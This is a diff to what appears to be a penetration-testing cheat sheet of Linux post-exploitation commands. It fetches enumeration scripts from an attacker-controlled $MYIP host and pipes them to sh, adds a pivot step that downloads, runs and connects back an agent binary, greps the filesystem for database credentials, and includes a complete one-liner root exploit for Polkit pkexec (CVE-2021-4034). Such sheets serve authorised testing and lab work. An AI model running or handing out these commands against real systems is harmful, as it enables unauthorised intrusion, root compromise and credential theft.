@@ -1485,21 +1485,22 @@ CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256c
 export PATH=/dev/shm:$PATH
 
 [*] File Transfer
-curl -s http://$MYIP:53/linux/linpeas.sh | sh
-wget -qO- http://$MYIP:53/linux/linpeas.sh | sh
+curl -s $MYIP:53/linux/linpeas.sh | sh
+wget -qO- $MYIP:53/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-curl -s http://$MYIP:53/whoami.sh | sh
+curl -s $MYIP:53/whoami.sh | sh
+curl -s $MYIP:53/linux/linpeas.sh | sh
+
++---------- Setup Pivot ----------+
+curl $MYIP:53/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/agent -ignore-cert -connect $MYIP:443
 
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 
 +---------- Polkit (CVE-2021-4034) ----------+
 echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
-
-+---------- Full Privesc Scan ----------+
-curl -s http://$MYIP:53/linux/linpeas.sh | sh
 
 +---------- Groups ----------+
 newgrp developer
